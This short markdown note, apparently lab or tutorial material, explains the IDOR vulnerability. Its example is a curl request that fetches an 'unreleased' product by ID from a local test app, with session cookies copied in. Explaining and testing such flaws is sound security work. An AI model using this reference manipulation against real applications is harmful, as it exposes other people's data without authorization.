# IDOR (Insecure Direct Object Reference)

Hodor's distant cousin, IDOR, is a vulnerability that occurs when an application exposes direct access to objects based on user-supplied input. This allows attackers to manipulate references to access unauthorized data.

## Example: Accessing Unreleased Products

```bash
curl 'http://localhost:3000/api/products/13' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9,ru;q=0.8' \
  -H 'Connection: keep-alive' \
  -b 'adminer_key=932442d9d9ca0b411613ada8e36dd6b0; adminer_sid=74d60747a63cfc128c0bdeff9e13f1cd; OptanonConsent=%7B%7D' \
  -H 'Referer: http://localhost:3000/products/4' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36' \
  -H 'sec-ch-ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"'
  ```
  